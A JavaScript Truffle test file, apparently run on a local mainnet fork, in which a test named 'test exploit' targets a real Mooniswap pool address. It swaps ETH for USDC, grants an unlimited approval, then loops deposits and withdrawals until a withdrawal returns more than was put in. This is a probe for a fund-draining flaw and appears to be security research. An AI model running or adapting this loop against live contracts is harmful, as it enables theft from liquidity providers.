const truffleContract = require('@truffle/contract');

const Web3 = require('web3');
const provider = new Web3.providers.HttpProvider("http://127.0.0.1:8545");

const { BigNumber, utils } = require("ethers")
const BN = require('bn.js');


// let lendingPoolAddressProviderABI = require("./abi/LendingPoolAddressProvider.json")
// let uniswapABI = require('../abi/uniswapRouter.json');
// let tokenABI = require("../abi/erc20.json")
// let wethABI = require("../abi/WETH.json")
// let cTokenABI = require("../abi/CToken.json")
// let cETHABI = require("../abi/CEth.json")

const advancetime = (time) => new Promise((resolve, reject) => {
    web3.currentProvider.send({
        jsonrpc: '2.0',
        method: 'evm_increaseTime',
        id: new Date().getTime(),
        params: [time]
    }, async (err, result) => {
        if (err) { return reject(err) }
        const newBlockHash = await web3.eth.getBlock('latest').hash

        return resolve(newBlockHash)
    })
})

// Helper function for toBaseUnit
function isString(s) {
    return (typeof s === 'string' || s instanceof String)
}

const toBaseUnit = (value, decimals) => {
    if (!isString(value)) {
        throw new Error('Pass strings to prevent floating point precision issues.')
    }
    const ten = new BN(10);
    const base = ten.pow(new BN(decimals));

    // Is it negative?
    let negative = (value.substring(0, 1) === '-');
    if (negative) {
        value = value.substring(1);
    }

    if (value === '.') {
        throw new Error(
            `Invalid value ${value} cannot be converted to`
            + ` base unit with ${decimals} decimals.`
        );
    }

    // Split it into a whole and fractional part
    let comps = value.split('.');
    if (comps.length > 2) { throw new Error('Too many decimal points'); }

    let whole = comps[0]; let
        fraction = comps[1];

    if (!whole) { whole = '0'; }
    if (!fraction) { fraction = '0'; }
    if (fraction.length > decimals) {
        throw new Error('Too many decimal places');
    }

    while (fraction.length < decimals) {
        fraction += '0';
    }

    whole = new BN(whole);
    fraction = new BN(fraction);
    let wei = (whole.mul(base)).add(fraction);

    if (negative) {
        wei = wei.neg();
    }

    return new BN(wei.toString(10), 10);
}

const parseBaseUnit = (value, decimals = 18) => {
    if (BN.isBN(value)) {
        value = value.toString()
    }
    if (!isString(value)) {
        throw new Error("Not a String")
    }
    value = BigNumber.from(value)
    return utils.formatUnits(value, decimals)
}

const advanceBlock = () => new Promise((resolve, reject) => {
    web3.currentProvider.send({
        jsonrpc: '2.0',
        method: 'evm_mine',
        id: new Date().getTime()
    }, async (err, result) => {
        if (err) { return reject(err) }
        // const newBlockHash =await web3.eth.getBlock('latest').hash
        return resolve()
    })
})

const advanceBlocks = async (num) => {
    let resp = []
    for (let i = 0; i < num; i++) {
        resp.push(advanceBlock())
    }
    await Promise.all(resp)
}

contract("Mooniswap Testing", () => {
    let accounts;
    let tokenAbi = require("../abi/erc20.json")
    let originalAdd = "0xb4db55a20e0624edd82a0cf356e3488b4669bd27"
    let originalAbi = require("../abi/mooniswap.json")
    let originalContract;
    let usdcAdd = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
    let usdc
    let wethAdd = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
    let weth
    let uniswapRouterAdd = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D';
    let uniswapABI = require('../abi/uniswapRouter.json');
    let uniswap


    before(async () => {
        accounts = await web3.eth.getAccounts()
        originalContract = truffleContract({ abi: originalAbi });
        originalContract.setProvider(provider);
        originalContract = await originalContract.at(originalAdd)

        usdc = truffleContract({ abi: tokenAbi });
        usdc.setProvider(provider);
        usdc = await usdc.at(usdcAdd)

        weth = truffleContract({ abi: tokenAbi });
        weth.setProvider(provider);
        weth = await weth.at(wethAdd)

        uniswap = truffleContract({ abi: uniswapABI });
        uniswap.setProvider(provider);
        uniswap = await uniswap.at(uniswapRouterAdd)

    })

    it("test exploit", async () => {
        // let contBalBef = await web3.eth.getBalance(originalContract.address)
        // let token0 = await originalContract.token0()
        // let token1 = await originalContract.token1()
        // let fee = await originalContract.fee()
        // let usdcAmount = await usdc.balanceOf(originalContract.address)
        // console.log({
        //     address: originalContract.address,
            // token0: token0,
            // token1:token1,
        //     contBalBef: contBalBef,
        //     fee: parseBaseUnit(fee),
        //     usdcAmount: parseBaseUnit(usdcAmount, "6")
        // });
        await uniswap.swapExactETHForTokens(0, [weth.address, usdc.address], accounts[0], Date.now() * 2, { from: accounts[0], value: toBaseUnit("100", "18")})
        await usdc.approve(originalContract.address, toBaseUnit("999999999999999", "6"), {from: accounts[0]})

        let usdcBalBefBef = await usdc.balanceOf(accounts[0]); 
        let ethBalBefBef = await web3.eth.getBalance(accounts[0])
        let count =0;
        while(true){
            await originalContract.depositFor([toBaseUnit("10", "18"), toBaseUnit("10000", "6")], [0, 0], accounts[0], {from: accounts[0], value:toBaseUnit("10", "18")})

            let ogBalanceBef = await originalContract.balanceOf(accounts[0]);
            // let totalSupply = await originalContract.totalSupply();
            let usdcBalBef = await usdc.balanceOf(accounts[0]);
            let ethBalBef = await web3.eth.getBalance(accounts[0])

            console.log({
                // ogBalanceBef: parseBaseUnit(ogBalanceBef, "18"),
                // totalSupply: parseBaseUnit(totalSupply, "18"),
                usdcBalDepDiff: parseBaseUnit(usdcBalBefBef.sub(usdcBalBef), "6"),
                ethBalDepDiff: parseBaseUnit(new BN(String(ethBalBefBef)).sub(new BN(String(ethBalBef))), "18")

            })

            await originalContract.withdraw(ogBalanceBef.add(toBaseUnit("0", "18")), [0, 0], {from: accounts[0]})

            // let ogBalanceAft = await originalContract.balanceOf(accounts[0]);
            let usdcBalAft = await usdc.balanceOf(accounts[0]);
            let ethBalAft = await web3.eth.getBalance(accounts[0])

            console.log({
                // ogBalanceAft: parseBaseUnit(ogBalanceAft, "18"),
                // totalSupply: parseBaseUnit(totalSupply, "18"),
                usdcBalWithDiff: parseBaseUnit(usdcBalAft.sub(usdcBalBef), "6"),
                ethBalWithDiff: parseBaseUnit(new BN(String(ethBalAft)).sub(new BN(String(ethBalBef))), "18")
            })
            count++;
            if((usdcBalAft.sub(usdcBalBef)).gt(usdcBalBefBef.sub(usdcBalBef)) || (new BN(String(ethBalAft)).sub(new BN(String(ethBalBef))).gt(new BN(String(ethBalBefBef)).sub(new BN(String(ethBalBef)))))){
                break
            }
        }
    })
    
})